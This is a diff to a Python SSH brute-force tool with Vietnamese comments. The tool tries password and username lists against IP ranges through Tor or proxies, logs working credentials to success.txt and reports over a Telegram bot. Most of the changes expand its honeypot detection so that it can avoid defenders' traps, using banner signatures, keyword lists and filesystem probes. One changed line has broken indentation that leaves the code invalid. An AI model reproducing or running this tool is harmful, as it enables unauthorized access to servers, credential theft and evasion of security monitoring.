@@ -31,7 +31,7 @@ logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler('sshV6.log'),
+        logging.FileHandler('ssh.log'),
         logging.StreamHandler(sys.stdout)
     ]
 )
@@ -183,6 +183,12 @@ def read_file(file_path: str) -> List[str]:
         logger.error(f"Lỗi khi đọc file {file_path}: {e}")
         return []
 
+def write_to_file(file_path: str, content: str):
+    """Ghi nội dung vào file với khóa đồng bộ"""
+    with lock:
+        with open(file_path, 'a') as f:
+            f.write(content + '\n')
+
 def check_port(ip: str, port: int) -> bool:
     """Kiểm tra cổng mở bằng socket với timeout ngắn"""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -318,11 +324,29 @@ def is_honeypot_banner(ip: str, port: int) -> bool:
         sock = socket.create_connection((ip, port), timeout=5)
         banner = sock.recv(1024).decode(errors='ignore').strip()
         sock.close()
-        honeypot_signatures = ["Cowrie", "Kippo", "Dionaea", "Honey", "Cisco SSH"]
-        suspicious_keywords = ["auth", "alert", "monitor", "log", "unauthorized"]
-        if any(sig in banner for sig in honeypot_signatures) or any(kw in banner.lower() for kw in suspicious_keywords):
-            with open('honeypot.txt', 'a') as f:
-                f.write(f"{ip}:{port} → 🚩 Suspicious SSH banner: '{banner[:100]}'\n")
+        honeypot_signatures = [
+            "Cowrie", "Kippo", "Dionaea", "Honey", "Cisco SSH",
+            "SSH-2.0-OpenSSH_5.1p1", "SSH-2.0-OpenSSH_6.0p1 Debian-4",
+            "libssh", "SSH-2.0-dropbear", "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8",
+            "SSH-2.0-OpenSSH_5.3"
+        ]
+        suspicious_keywords = [
+            "auth", "alert", "monitor", "log", "unauthorized",
+            "access denied", "honeypot", "security", "warning", "surveillance",
+            "authentication failed", "further authentication required",
+            "this system is monitored", "intrusion", "incident", "error",
+            "suspicious", "logged", "trace", "attempt", "forensic", "pre-authentication", "banner message from server"
+        ]
+        for sig in honeypot_signatures:
+            if sig.lower() in banner.lower():
+                write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Suspicious SSH banner: '{banner[:100]}'")
+                return True
+        for keyword in suspicious_keywords:
+            if keyword.lower() in banner.lower():
+                write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Banner contains suspicious keyword: '{banner[:100]}'")
+                return True
+        if len(banner) < 10 or "SSH-2.0" not in banner:
+            write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Banner too short or invalid: '{banner[:100]}'")
             return True
         return False
     except Exception:
@@ -335,7 +359,8 @@ def is_honeypot_response_time(ip: str, port: int) -> bool:
         sock = socket.create_connection((ip, port), timeout=5)
         sock.recv(1024)
         sock.close()
-        return (time.time() - start_time) > 2.0 or (time.time() - start_time) < 0.05
+        response_time = time.time() - start_time
+        return response_time > 2.0 or response_time < 0.05
     except Exception:
         return False
 
@@ -347,8 +372,21 @@ def is_honeypot_filesystem(ip: str, port: int, username: str, password: str) -> 
         ssh.connect(ip, port=port, username=username, password=password, timeout=5)
         stdin, stdout, stderr = ssh.exec_command('ls /', timeout=5)
         output_root = stdout.read().decode().strip()
+        actual_dirs = output_root.split()
+        suspicious_dirs = [
+            "bin", "boot", "dev", "etc", "home", "lib", "media", "mnt", "opt",
+            "proc", "root", "run", "sbin", "srv", "sys", "tmp", "usr", "var"
+        ]
+        suspicious_root = len(actual_dirs) <= 3 or all(d not in suspicious_dirs for d in actual_dirs)
+        stdin, stdout, stderr = ssh.exec_command('ls ~', timeout=5)
+        output_home = stdout.read().decode().strip()
+        suspicious_home = output_home == ""
         ssh.close()
-        return len(output_root.split()) < 3
+        if suspicious_root:
+            write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Abnormal root (/) directory: '{output_root[:100]}'")
+        if suspicious_home:
+            write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Empty or missing home (~) directory.")
+        return suspicious_root or suspicious_home
     except Exception:
         return False
 
@@ -357,13 +395,13 @@ def is_honeypot_error_messages(ip: str, port: int, username: str, password: str)
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(ip, port=port, username=username, password="wrongpass", timeout=5)
+        ssh.connect(ip, port=port, username=username, password="thisiswrong", timeout=5)
         ssh.close()
         return True
-    except AuthenticationException:
-        return False
+    except AuthenticationException as e:
+        return "authentication failed" not in str(e).lower()
     except Exception:
-        return True
+        return False
 
 def is_honeypot_behavior(ip: str, port: int, username: str, password: str) -> bool:
     """Kiểm tra honeypot dựa trên hành vi lệnh"""
@@ -430,7 +468,7 @@ def is_honeypot(ip: str, port: int, username: str, password: str) -> List[str]:
         reasons.append("🔓 Abnormal login error")
     if check_behavior and is_honeypot_behavior(ip, port, username, password):
         reasons.append("⚙️ Abnormal command behavior")
-    if check_prompt and is_honeypot_prompt(ip, port, username, password):
+        if check_prompt and is_honeypot_prompt(ip, port, username, password):
         reasons.append("📜 Missing shell prompt")
     if check_deep and is_honeypot_deep_check(ip, port, username, password):
         reasons.append("🧪 Suspicious deep check")
@@ -438,7 +476,7 @@ def is_honeypot(ip: str, port: int, username: str, password: str) -> List[str]:
         reasons.append("⏱ Abnormal TTL")
     return reasons
 
-def check_ssh(ip: str, port: int, username: str, password: Optional[str] = None, key_file: Optional[str] = None) -> bool:
+def check_ssh(ip: str, port: int, username: str, password: str) -> bool:
     """Kiểm tra kết nối SSH và lưu kết quả"""
     global stats, cache_results
     if (ip, port, username) in cache_results:
@@ -451,12 +489,11 @@ def check_ssh(ip: str, port: int, username: str, password: Optional[str] = None,
         save_to_db(ip, port, "failed", "")
         return False
 
-    honeypot_reasons = is_honeypot(ip, port, username, password or "dummy")
+    honeypot_reasons = is_honeypot(ip, port, username, password)
     if honeypot_reasons and not check_normal:
         reason_text = " | ".join(honeypot_reasons)
-        logger.warning(f"[HONEYPOT] {ip}:{port} | {username} | {password or key_file} → {reason_text}")
-        with open('honeypot.txt', 'a') as f:
-            f.write(f"{ip}:{port} | {username} | {password or key_file} → {reason_text}\n")
+        logger.warning(f"[HONEYPOT] {ip}:{port} | {username} | {password} → {reason_text}")
+        write_to_file('honeypot.txt', f"{ip}:{port} | {username} | {password} → {reason_text}")
         with lock:
             stats["honeypot"] += 1
         save_to_db(ip, port, "honeypot", reason_text)
@@ -465,32 +502,28 @@ def check_ssh(ip: str, port: int, username: str, password: Optional[str] = None,
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        if key_file:
-            ssh.connect(ip, port=port, username=username, key_filename=key_file, timeout=DEFAULT_TIMEOUT)
-        else:
-            ssh.connect(ip, port=port, username=username, password=password, timeout=DEFAULT_TIMEOUT)
+        ssh.connect(ip, port=port, username=username, password=password, timeout=DEFAULT_TIMEOUT)
         banner = ssh.get_transport().get_banner().decode(errors='ignore') if hasattr(ssh.get_transport(), 'get_banner') else ""
-        logger.info(f"[SUCCESS] {ip}:{port} | {username} | {password or key_file} | Banner: {banner[:50]}")
-        with open('success.txt', 'a') as f:
-            f.write(f"{ip}:{port} | {username} | {password or key_file} | Banner: {banner[:50]}\n")
+        logger.info(f"[SUCCESS] {ip}:{port} | {username} | {password} | Banner: {banner[:50]}")
+        write_to_file('success.txt', f"{ip}:{port} | {username} | {password} | Banner: {banner[:50]}")
         with lock:
             stats["success"] += 1
         save_to_db(ip, port, "success", banner)
         return True
     except AuthenticationException:
-        logger.info(f"[FAILED] {ip}:{port} | {username} | {password or key_file}")
+        logger.info(f"[FAILED] {ip}:{port} | {username} | {password}")
         with lock:
             stats["failed"] += 1
         save_to_db(ip, port, "failed", "")
         return False
     except SSHException as e:
-        logger.error(f"[SSH ERROR] {ip}:{port} | {username} | {password or key_file} | {e}")
+        logger.error(f"[SSH ERROR] {ip}:{port} | {username} | {password} | {e}")
         with lock:
             stats["errors"] += 1
         save_to_db(ip, port, "error", str(e))
         return False
     except Exception as e:
-        logger.error(f"[CONNECTION ERROR] {ip}:{port} | {username} | {password or key_file} | {e}")
+        logger.error(f"[CONNECTION ERROR] {ip}:{port} | {username} | {password} | {e}")
         with lock:
             stats["errors"] += 1
         save_to_db(ip, port, "error", str(e))
@@ -498,6 +531,7 @@ def check_ssh(ip: str, port: int, username: str, password: Optional[str] = None,
     finally:
         ssh.close()
 
+def brute_worker(ip: str, port: int, username: str, passwords: List[str], key_files: List[str] = None):
     """Worker để quét SSH"""
     global stop_flag, scanned_ips
     if stop_flag:
@@ -509,7 +543,7 @@ def check_ssh(ip: str, port: int, username: str, password: Optional[str] = None,
         if check_ssh(ip, port, username, password):
             break
         attempts += 1
-        time.sleep(random.uniform(0.05, 0.15))
+        time.sleep(random.uniform(0.1, 0.3))
     if key_files:
         for key_file in key_files:
             if stop_flag:
@@ -661,7 +695,7 @@ async def status_command(update: Update, context):
     elif use_proxy and current_proxy:
         proxy_text = f"🟢 Proxy ({current_proxy['host']}:{current_proxy['port']}, Ping: {next((p['ping'] for p in proxy_status if p['host'] == current_proxy['host'] and p['port'] == current_proxy['port']), 'N/A')})"
     status_text = (
-        f"📊 [ SSHV6 Tool Status - {datetime.datetime.now().strftime('%H:%M:%S %d/%m/%Y')} ]\n\n"
+        f"📊 [ SSH Tool Status - {datetime.datetime.now().strftime('%H:%M:%S %d/%m/%Y')} ]\n\n"
         f"🧠 Threads: {DEFAULT_THREADS} ({'đang quét' if not stop_flag else 'không hoạt động'})\n"
         f"🧪 Max Attempts: {DEFAULT_MAX_ATTEMPTS} mỗi IP\n"
         f"⏱ Timeout: {DEFAULT_TIMEOUT}s\n"
@@ -671,7 +705,7 @@ async def status_command(update: Update, context):
         f"📩 Bot Telegram: {'✅ Đang chạy (Admin ID: ' + ADMIN_ID + ')' if ADMIN_ID else '🔴 Không chạy'}\n"
         f"💥 IP Block Monitor: {'🟢 Bật' if ip_block_monitor else '🔴 Tắt'}\n"
         f"📅 Uptime: {uptime}\n"
-        f"📁 Logs: success.txt, honeypot.txt, sshV6.log\n"
+        f"📁 Logs: success.txt, honeypot.txt, ssh.log\n"
         f"📊 Stats: Success={stats['success']}, Failed={stats['failed']}, Honeypot={stats['honeypot']}, Errors={stats['errors']}"
     )
     await update.message.reply_text(status_text, parse_mode="Markdown")
@@ -687,14 +721,14 @@ async def send_to_telegram(message: str):
 
 def main():
     """Hàm chính để chạy tool"""
-    global config, args, ip_list, ports, key_files
+    global config, args, ip_list, ports, key_files, use_tor, use_proxy
     config = read_config()
     init_db()
     parser = argparse.ArgumentParser(description="SSH Brute Force Tool with Honeypot Detection")
     parser.add_argument("--ip", help="IP hoặc CIDR range (e.g., 192.168.1.1 or 192.168.1.0/24)")
-    parser.add_argument("--ip-file", help="File chứa danh sách IP")
+    parser.add_argument("--ip-file", help="File chứa danh sách IP", default="cc.txt")
     parser.add_argument("--port-file", help="File chứa danh sách port")
-    parser.add_argument("--password-file", help="File chứa danh sách mật khẩu")
+    parser.add_argument("--password-file", help="File chứa danh sách mật khẩu", default="pass.txt")
     parser.add_argument("--key-file", help="File chứa key SSH")
     parser.add_argument("--username", default="root", help="Tên người dùng (mặc định: root)")
     parser.add_argument("--tor", action="store_true", help="Sử dụng Tor")
@@ -735,13 +769,38 @@ def main():
     check_all = args.all
     check_bigscan = args.bigscan
 
+    # Khởi động bot Telegram
+    if config["telegram_token"]:
+        async def run_bot():
+            try:
+                application = Application.builder().token(config["telegram_token"]).build()
+                conv_handler = ConversationHandler(
+                    entry_points=[CommandHandler('start', start)],
+                    states={KEY_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_key)]},
+                    fallbacks=[],
+                )
+                application.add_handler(conv_handler)
+                application.add_handler(CommandHandler('tor', tor_command))
+                application.add_handler(CallbackQueryHandler(tor_button, pattern='^tor_'))
+                application.add_handler(CommandHandler('mode', mode_command))
+                application.add_handler(CallbackQueryHandler(mode_button, pattern='^mode_'))
+                application.add_handler(CommandHandler('status', status_command))
+                await application.initialize()
+                await application.start()
+                await application.updater.start_polling()
+                logger.info("Bot Telegram đã khởi động")
+            except Exception as e:
+                logger.error(f"Lỗi khởi động bot: {e}")
+                asyncio.run(send_to_telegram(f"<b>Lỗi</b>: Không thể khởi động bot Telegram: {str(e)}"))
+        threading.Thread(target=lambda: asyncio.run(run_bot()), daemon=True).start()
+
     # Load IPs
     if args.ip:
         ip_list = [args.ip] if not '/' in args.ip else expand_cidr(args.ip)
     elif args.ip_file:
         ip_list = read_file(args.ip_file)
     else:
-        ip_list = expand_cidr("172.0.0.0/16")
+        ip_list = read_file("cc.txt")
     total_ips = len(ip_list)
 
     # Load ports
@@ -751,13 +810,24 @@ def main():
         ports = config.get("ports", [DEFAULT_PORT])
 
     # Load passwords
-    passwords = read_file(args.password_file) if args.password_file else ["admin", "password", "123456"]
+    passwords = read_file(args.password_file) if args.password_file else read_file("pass.txt")
+    if not passwords:
+        passwords = ["admin", "password", "123456"]
+        logger.warning("No password file found. Using default passwords.")
+
+    # Load usernames
+    username_list = read_file("users.txt") if os.path.exists("users.txt") else ["root"]
+    if not username_list:
+        username_list = ["root"]
+        logger.warning("No username file found. Using default username: root")
 
     # Load key files
     if args.key_file:
         key_files = [args.key_file]
 
     # Cấu hình proxy/Tor
+    use_tor = False  # Gán giá trị mặc định
+    use_proxy = False  # Gán giá trị mặc định
     if args.tor:
         use_tor = True
         TOR_PROXY["port"] = args.tor_port
@@ -796,7 +866,8 @@ def main():
         futures = []
         for ip in ip_list:
             for port in ports:
-                futures.append(executor.submit(brute_worker, ip, port, args.username, passwords, key_files))
+                for username in username_list:
+                    futures.append(executor.submit(brute_worker, ip, port, username, passwords, key_files))
         for future in as_completed(futures):
             try:
                 future.result()
@@ -825,6 +896,26 @@ def save_results():
             logger.info("Kết quả đã được lưu vào results.json")
         except Exception as e:
             logger.error(f"Lỗi khi lưu kết quả: {e}")
+
+def print_usage():
+    """Hiển thị hướng dẫn sử dụng"""
+    print("""
+Usage: python ssh.py [--honeypot_options]
+Honeypot_options:
+  --normal        Brute SSH without honeypot detection (May mistake honeypots as real)
+  --banner        Check SSH banner (Recommended)
+  --response      Check abnormal response time
+  --filesystem    Check system file structure
+  --error         Check abnormal login error (Recommended)
+  --behavior      Check command behavior
+  --prompt        Check for missing shell prompt indicators
+  --deep          Check uname and passwd (Not recommended)
+  --network       Check network behavior
+  --connections   Check connection patterns
+  --ttl           Check TTL value
+  --response-behavior Check response behavior
+  --all           Enable all honeypot detection modes
+  """)
 
 if __name__ == "__main__":
     main()
